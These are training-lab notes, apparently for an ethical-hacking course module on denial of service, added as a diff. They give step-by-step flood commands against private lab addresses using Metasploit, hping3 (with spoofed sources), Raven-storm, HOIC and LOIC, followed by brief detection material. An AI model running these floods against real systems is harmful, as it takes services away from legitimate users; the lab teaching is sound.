@@ -1,0 +1,190 @@
+Module 10: Denial-of-Service
+
+
+1. Perform DoS and DDoS attacks using various Techniques
+
+In general, the following are categories of DoS/DDoS attack vectors:
+
+- Volumetric Attacks: Consume the bandwidth of the target network or service
+
+Attack techniques:
+
+. UDP flood attack
+. ICMP flood attack
+. Ping of Death and smurf attack
+. Pulse wave and zero-day attack
+
+- Protocol Attacks: Consume resources like connection state tables present in the network infrastructure components such as load-  balancers, firewalls, and application servers
+
+Attack techniques:
+
+. SYN flood attack
+. Fragmentation attack
+. Spoofed session flood attack
+. ACK flood attack
+
+- Application Layer Attacks: Consume application resources or services, thereby making them unavailable to other legitimate users
+
+Attack techniques:
+
+. HTTP GET/POST attack
+. Slowloris attack
+. UDP application layer flood attack
+. DDoS extortion attack
+
+
+
+
+
+a. Perform a DoS attack (SYN flooding) on a target host using Metasploit
+
+PS: Use the Parrot Security (10.10.1.13) machine to perform SYN flooding on the Windows 11 (10.10.1.11) machine through port 21
+
+$ nmap -p 21 10.10.1.11    (Confirm Port 21 is open)
+$ msfconsole
+> use auxiliary/dos/tcp/synflood
+> show options
+> set RHOST 10.10.1.11
+> set RPORT 21
+> set SHOST 10.10.1.19      (Spoofable IP Address)
+> exploit
+> Ctrl+C  (When done)
+
+Launch Wireshark on victim (.11)
+
+
+
+
+
+
+b. Perform a DoS attack on a target host using hping3
+
+PS: hping3 is a command-line-oriented network scanning and packet crafting tool for the TCP/IP protocol that sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols.
+
+PS: Here, we will use the hping3 tool to perform DoS attacks such as SYN flooding, Ping of Death (PoD) attacks, and UDP application layer flood attacks on a target host.
+
+Launch Wireshark on .11
+
+A. SYN Flooding Attack
+
+From .13
+$ hping3 -S 10.10.1.11 -a 10.10.1.19 -p 22 --flood    (-S = SYN flag, -a = Spoofable IP, -p = destination port, --flood = send packets
+$ Ctrl+C       (After a few seconds -otherwise system crash)
+
+View Wireshark Capture -> Statistics -> I/O Graph
+Close Wireshark
+
+
+
+B. Ping of Death (PoD)
+PS: In a PoD attack, the attacker tries to crash, freeze, or destabilize the targeted system or service by sending malformed or oversized packets using a simple ping command.
+
+Launch Wireshark on .11
+$ hping3 -d 65538 -S -p 21 --flood 10.10.1.11     (-d = data size, -S = SYN Flood, -p = dest port)
+$ Ctrl+C
+Close Wireshark
+
+
+
+C. UDP Application Layer Flooding (on .19, using NetBIOS Port 139. )
+Launch Wireshark on .19
+
+$ hping3 -2 -p 139 --flood 10.10.1.19    (-2 = specifies the UDP mode, -p = dest port)
+$ Ctrl+C
+
+Note: Some of the UDP based application layer protocols that attackers can employ to flood target networks include:
+
+Note: - **CharGEN **(Port 19)
+
+- SNMPv2 (Port 161)
+- QOTD (Port 17)
+- RPC (Port 135)
+- SSDP (Port 1900)
+- CLDAP (Port 389)
+- TFTP (Port 69)
+- NetBIOS (Port 137,138,139)
+- NTP (Port 123)
+- Quake Network Protocol (Port 26000)
+- VoIP (Port 5060)
+
+
+
+c. Perform a DoS attack using Raven-storm
+
+PS: Raven-Storm is a DDoS tool for penetration testing that features Layer 3, Layer 4, and Layer 7 attacks.
+
+Launch Wireshark on .19
+$ rst   (Launch raven-storm)
+> l4    (load layer4 module [UDP/TCP])
+> ip 10.10.1.19
+> port 80
+> threads 20000
+> run 
+
+
+
+d. Perform a DDoS attack using HOIC
+
+PS:  It sends HTTP, POST, and GET requests to a computer that uses lulz inspired GUIs. It offers a high-speed multi-threaded HTTP Flood; a built-in scripting system allows the deployment of “boosters,” which are scripts designed to thwart DDoS countermeasures and increase DoS output.
+
+Start Wireshack on target (.13)
+Copy and Paste HOIC on attackers (.11, .19, .22)
+hoic2.1.exe
+Target: http://10.10.1.13, 
+Power: High
+Booster: GenericBoost.hoic
+THREADS: 20
+FIRE TEH LAZER
+
+
+
+e. Perform a DDoS attack using LOIC
+
+Start LOIC
+IP: 10.10.1.13 -> Lock On
+Attack Method: UDP
+Threads: 10
+Power: Slide to Middle
+IMMA CHARGIN MAH LAZER
+
+
+
+
+
+
+2. Detect and protect against DoS and DDoS attacks
+
+PS:  All the detection techniques used today define an attack as an abnormal and noticeable deviation in network traffic statistics and characteristics. These techniques involve the statistical analysis of deviations to categorize malicious and genuine traffic.
+
+The following are the three types of detection techniques:
+
+- Activity Profiling: Profiles based on the average packet rate for a network flow, which consists of consecutive packets with similar packet header information
+- Sequential Change-point Detection: Filters network traffic by IP addresses, targeted port numbers, and communication protocols used, and stores the traffic flow data in a graph that shows the traffic flow rate over time
+- Wavelet-based Signal Analysis: Analyzes network traffic in terms of spectral components
+
+
+
+a. Detect and protect against DDoS attacks using Anti DDoS Guardian
+
+PS: It protects IIS servers, Apache serves, game servers, Camfrog servers, mail servers, FTP servers, VOIP PBX, and SIP servers and other systems. Anti DDoS Guardian monitors each incoming and outgoing packet in Real-Time. It displays the local address, remote address, and other information of each network flow. Anti DDoS Guardian limits network flow number, client bandwidth, client concurrent TCP connection number, and TCP connection rate. It also limits the UDP bandwidth, UDP connection rate, and UDP packet rate.
+
+Install Anti DDoS Guardian (.11)
+Launch LOIC Against the System 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
